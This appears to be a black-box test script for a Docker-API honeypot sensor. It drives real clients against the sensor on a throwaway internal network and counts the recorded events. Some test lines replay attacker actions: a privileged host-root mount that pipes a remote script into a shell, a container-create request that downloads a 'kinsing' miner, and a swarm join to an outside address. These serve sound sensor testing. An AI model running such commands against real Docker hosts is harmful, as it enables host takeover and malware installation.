#!/usr/bin/env bash
# Black-box run of real clients against a built image. Run from the repository root:
#   sensors/docker/tests/blackbox.sh
# Needs docker. Everything is throwaway (internal network, no published ports); the network,
# containers and the image are removed at the end. Prints the events the sensor recorded.
set -euo pipefail
NET=sp-docker-bb
IMG=sp-docker-bb:dev
docker network create --internal $NET >/dev/null
docker run -d --rm --name sp-docker-bb-redis --network $NET --network-alias redis valkey/valkey:9.1-alpine3.24 >/dev/null
docker build -q -f sensors/docker/Dockerfile -t $IMG . >/dev/null
docker run -d --rm --name sp-docker-bb --network $NET --network-alias sensor \
  -e REDIS_HOST=redis -e EVENTS_STREAM=events:docker \
  --read-only --tmpfs /tmp:rw,noexec,nosuid,nodev,size=16m \
  --tmpfs /data:rw,uid=10001,gid=10001,mode=0700,size=1m \
  --cap-drop ALL --security-opt no-new-privileges:true --memory 256m --memory-swap 256m \
  --cpus 0.5 --pids-limit 128 $IMG >/dev/null
trap 'docker rm -f sp-docker-bb sp-docker-bb-redis >/dev/null 2>&1; docker network rm $NET >/dev/null 2>&1; docker rmi $IMG >/dev/null 2>&1' EXIT
sleep 4
D="docker run --rm --network $NET -e DOCKER_HOST=tcp://sensor:2375 docker:27-cli"
$D version
{ $D info | head -30; } || true
$D ps -a
$D images
$D run --rm --privileged -v /:/host alpine chroot /host sh -c 'curl http://203.0.113.9/x.sh | sh'
$D run -d --name job1 alpine sleep 100
$D exec job1 id
$D run alpine echo hello
$D swarm join --token SWMTKN-1-example 203.0.113.50:2377 || true
$D login -u admin -p example-password registry.example.net || true
docker run --rm --network $NET curlimages/curl -si http://sensor:2375/_ping
docker run --rm --network $NET curlimages/curl -si http://sensor:2375/v1.47/version
docker run --rm --network $NET curlimages/curl -si -X POST -H 'Content-Type: application/json' \
  -d '{"Image":"ubuntu","Cmd":["/bin/bash","-c","wget http://198.51.100.4/kinsing -O /tmp/k"],"HostConfig":{"Binds":["/:/mnt"]}}' \
  http://sensor:2375/containers/create
# Takes several minutes: the version probes that send partial requests wait for the head timeout.
docker run --rm --network $NET instrumentisto/nmap -sV -p 2375 -Pn sensor
docker exec sp-docker-bb-redis valkey-cli XLEN events:docker
